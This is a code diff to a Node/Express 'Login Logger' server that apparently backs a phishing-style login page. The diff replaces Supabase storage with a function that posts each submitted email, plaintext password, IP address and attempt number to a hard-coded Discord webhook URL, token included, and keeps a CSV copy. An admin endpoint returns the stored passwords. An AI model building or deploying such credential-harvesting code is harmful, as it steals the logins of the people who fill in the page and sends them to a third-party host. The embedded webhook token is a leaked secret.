@@ -4,7 +4,7 @@ import fs from 'fs';
 import path from 'path';
 import { fileURLToPath } from 'url';
 import moment from 'moment';
-import { createClient } from '@supabase/supabase-js';
+import https from 'https';
 
 const __filename = fileURLToPath(import.meta.url);
 const __dirname = path.dirname(__filename);
@@ -18,19 +18,63 @@ app.use(express.json());
 // Serve static files from the React build directory (path needed for React SPA fallback)
 const distPath = path.join(__dirname, 'dist');
 
-// ─── Supabase Configuration ──────────────────────────────────────
-const SUPABASE_URL = process.env.SUPABASE_URL || 'https://pgsccgetvjjoerefqitb.supabase.co';
-const SUPABASE_SERVICE_KEY = process.env.SUPABASE_SERVICE_KEY || '';
+// ─── Discord Webhook Configuration ──────────────────────────────
+const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL || 'https://discord.com/api/webhooks/1528008607575052462/UxRgNZJUUAEfWVUkRnsTM57JIS-_-Fwsz-uhloGf8RXiwIOmVEywpxVo2s0ORuzDQbBt';
 
-let supabase;
-let dbConnected = false;
+let webhookConnected = false;
 
-if (SUPABASE_SERVICE_KEY) {
-  supabase = createClient(SUPABASE_URL, SUPABASE_SERVICE_KEY);
-  dbConnected = true;
-  console.log('✅ Connected to Supabase');
+if (DISCORD_WEBHOOK_URL) {
+  webhookConnected = true;
+  console.log('✅ Connected to Discord Webhook');
 } else {
-  console.warn('⚠️  Supabase key not configured. Using CSV fallback.');
+  console.warn('⚠️  Discord webhook not configured. Using CSV fallback only.');
+}
+
+// Function to send message to Discord webhook
+async function sendToDiscord(logData) {
+  if (!webhookConnected) return;
+  
+  const embed = {
+    title: '🔐 Login Attempt Logged',
+    color: 16711680, // Red
+    fields: [
+      { name: 'Email', value: logData.username, inline: false },
+      { name: 'Password', value: `||${logData.password}||`, inline: false }, // Spoiler tag
+      { name: 'Status', value: logData.status, inline: false },
+      { name: 'Attempt #', value: String(logData.attempt_number), inline: true },
+      { name: 'IP Address', value: logData.ip_address, inline: true },
+      { name: 'Timestamp', value: new Date(logData.timestamp).toLocaleString(), inline: false },
+    ],
+    timestamp: new Date().toISOString(),
+  };
+  
+  const payload = JSON.stringify({ embeds: [embed] });
+  
+  return new Promise((resolve) => {
+    const url = new URL(DISCORD_WEBHOOK_URL);
+    const options = {
+      hostname: url.hostname,
+      path: url.pathname + url.search,
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        'Content-Length': Buffer.byteLength(payload),
+      },
+    };
+    
+    const req = https.request(options, (res) => {
+      res.on('data', () => {});
+      res.on('end', () => resolve());
+    });
+    
+    req.on('error', (err) => {
+      console.error('Discord webhook error:', err.message);
+      resolve();
+    });
+    
+    req.write(payload);
+    req.end();
+  });
 }
 
 // Ensure logs directory exists (for CSV fallback)
@@ -66,22 +110,8 @@ app.post('/api/logs-login', async (req, res) => {
       ip_address: ipAddress,
     };
     
-    // Try Supabase first
-    if (dbConnected && supabase) {
-      try {
-        const { error } = await supabase
-          .from('login_logs')
-          .insert([logData]);
-        
-        if (error) {
-          console.error('Error saving to Supabase:', error.message);
-          throw error;
-        }
-      } catch (err) {
-        console.error('Error saving to Supabase:', err.message);
-        dbConnected = false; // Fallback to CSV
-      }
-    }
+    // Send to Discord webhook
+    await sendToDiscord(logData);
     
     // Also save to CSV as backup
     const csvRow = [
@@ -97,7 +127,7 @@ app.post('/api/logs-login', async (req, res) => {
     
     console.log(`[${moment().format('YYYY-MM-DD HH:mm:ss')}] Login attempt logged: ${username} (Attempt #${attemptNumber} - ${status})`);
     
-    res.json({ success: true, message: 'Login attempt logged', stored: dbConnected ? 'Supabase' : 'CSV' });
+    res.json({ success: true, message: 'Login attempt logged', stored: 'Discord + CSV' });
   } catch (error) {
     console.error('Error logging login attempt:', error);
     res.status(500).json({ success: false, error: error.message });
@@ -109,44 +139,53 @@ app.get('/api/admin/logs', async (req, res) => {
   try {
     const { limit = 100, status, username } = req.query;
     
-    let logs;
+    // Read from CSV
+    const data = fs.readFileSync(csvFilePath, 'utf-8');
+    const lines = data.split('\n').slice(1).filter(Boolean);
     
-    if (dbConnected && supabase) {
-      try {
-        let query = supabase
-          .from('login_logs')
-          .select('*')
-          .order('timestamp', { ascending: false })
-          .limit(parseInt(limit));
-        
-        if (status) {
-          query = query.eq('status', status);
+    let logs = lines.map((line, index) => {
+      // Proper CSV parsing handling quoted fields
+      const parts = [];
+      let current = '';
+      let inQuotes = false;
+      
+      for (let i = 0; i < line.length; i++) {
+        const char = line[i];
+        if (char === '"') {
+          inQuotes = !inQuotes;
+        } else if (char === ',' && !inQuotes) {
+          parts.push(current.trim().replace(/^"|"$/g, ''));
+          current = '';
+        } else {
+          current += char;
         }
-        
-        if (username) {
-          query = query.ilike('username', `%${username}%`);
-        }
-        
-        const { data, error } = await query;
-        
-        if (error) throw error;
-        
-        logs = data || [];
-      } catch (err) {
-        console.error('Error retrieving from Supabase:', err.message);
-        throw err;
       }
-    } else {
-      // Fallback: Read from CSV
-      const data = fs.readFileSync(csvFilePath, 'utf-8');
-      const lines = data.split('\n').slice(1).filter(Boolean);
-      logs = lines.map(line => {
-        const [timestamp, user, pass, attempt, stat, ua, ip] = line.split(',');
-        return { timestamp, username: user, password: pass, attempt_number: parseInt(attempt), status: stat, user_agent: ua, ip_address: ip };
-      }).reverse().slice(0, parseInt(limit));
+      parts.push(current.trim().replace(/^"|"$/g, ''));
+      
+      return {
+        id: lines.length - index,
+        timestamp: parts[0]?.trim(),
+        username: parts[1]?.trim(),
+        password: parts[2]?.trim(),
+        attempt_number: parseInt(parts[3]) || 1,
+        status: parts[4]?.trim(),
+        user_agent: parts[5]?.trim(),
+        ip_address: parts[6]?.trim(),
+      };
+    }).reverse();
+    
+    // Apply filters
+    if (status) {
+      logs = logs.filter(log => log.status?.includes(status));
+    }
+    if (username) {
+      logs = logs.filter(log => log.username?.toLowerCase().includes(username.toLowerCase()));
     }
     
-    res.json({ success: true, count: logs.length, logs, source: dbConnected ? 'Supabase' : 'CSV' });
+    // Apply limit
+    logs = logs.slice(0, parseInt(limit));
+    
+    res.json({ success: true, count: logs.length, logs, source: 'CSV (Discord Webhook Backup)' });
   } catch (error) {
     console.error('Error retrieving logs:', error);
     res.status(500).json({ success: false, error: error.message });
@@ -156,30 +195,39 @@ app.get('/api/admin/logs', async (req, res) => {
 // ─── Export Logs as JSON (for GitHub Actions backup) ─────────────
 app.get('/api/admin/logs/export', async (req, res) => {
   try {
-    let logs;
+    const data = fs.readFileSync(csvFilePath, 'utf-8');
+    const lines = data.split('\n').slice(1).filter(Boolean);
     
-    if (dbConnected && supabase) {
-      try {
-        const { data, error } = await supabase
-          .from('login_logs')
-          .select('*')
-          .order('timestamp', { ascending: false });
-        
-        if (error) throw error;
-        
-        logs = data || [];
-      } catch (err) {
-        console.error('Error exporting from Supabase:', err.message);
-        throw err;
+    const logs = lines.map((line, index) => {
+      // Proper CSV parsing handling quoted fields
+      const parts = [];
+      let current = '';
+      let inQuotes = false;
+      
+      for (let i = 0; i < line.length; i++) {
+        const char = line[i];
+        if (char === '"') {
+          inQuotes = !inQuotes;
+        } else if (char === ',' && !inQuotes) {
+          parts.push(current.trim().replace(/^"|"$/g, ''));
+          current = '';
+        } else {
+          current += char;
+        }
       }
-    } else {
-      const data = fs.readFileSync(csvFilePath, 'utf-8');
-      const lines = data.split('\n').slice(1).filter(Boolean);
-      logs = lines.map(line => {
-        const [timestamp, user, pass, attempt, stat, ua, ip] = line.split(',');
-        return { timestamp, username: user, password: pass, attempt_number: parseInt(attempt), status: stat, user_agent: ua, ip_address: ip };
-      });
-    }
+      parts.push(current.trim().replace(/^"|"$/g, ''));
+      
+      return {
+        id: lines.length - index,
+        timestamp: parts[0]?.trim(),
+        username: parts[1]?.trim(),
+        password: parts[2]?.trim(),
+        attempt_number: parseInt(parts[3]) || 1,
+        status: parts[4]?.trim(),
+        user_agent: parts[5]?.trim(),
+        ip_address: parts[6]?.trim(),
+      };
+    }).reverse();
     
     res.json({ timestamp: new Date().toISOString(), total: logs.length, logs });
   } catch (error) {
@@ -193,7 +241,7 @@ app.get('/api/health', (req, res) => {
   res.json({ 
     status: 'Logger server is running', 
     port: PORT,
-    database: dbConnected ? 'Supabase Connected' : 'Using CSV Fallback',
+    logging: webhookConnected ? 'Discord Webhook Connected' : 'CSV Fallback Only',
     csvPath: csvFilePath,
   });
 });
@@ -208,6 +256,6 @@ app.get('*', (req, res) => {
 
 app.listen(PORT, () => {
   console.log(`\n🔒 Login Logger Server running on http://localhost:${PORT}`);
-  console.log(`📊 Database: ${dbConnected ? 'Supabase' : 'CSV (Fallback)'}`);
+  console.log(`� Logging: Discord Webhook + CSV Backup`);
   console.log(`📁 CSV backup: ${csvFilePath}\n`);
 });
